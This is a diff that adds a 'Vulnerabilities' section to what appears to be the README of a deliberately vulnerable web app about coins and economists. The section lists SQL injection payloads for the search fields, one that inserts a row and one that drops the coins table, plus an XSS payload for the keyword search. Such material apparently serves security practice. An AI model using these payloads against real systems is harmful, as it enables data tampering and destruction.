@@ -47,3 +47,29 @@ CREATE TABLE TRACKAD (
 CREATE TABLE economists (id INT AUTO_INCREMENT PRIMARY KEY,name VARCHAR(255),image_url VARCHAR(255),short_info TEXT);
 ```
 
+
+# Vulnerabilities
+
+## SQL Injection
+
+### Insert these commands to search fields in '/coins' and '/economists' pages
+
+```sql
+';INSERT INTO coins (name, url) values ('btc','btc.org');--
+```
+
+```sql
+';DROP TABLE coins;--
+```
+
+
+## XSS
+
+### Insert this HTML command to keyword search field
+
+```html
+<img src=1 onerror="alert('hacked')"/>
+```
+
+
+
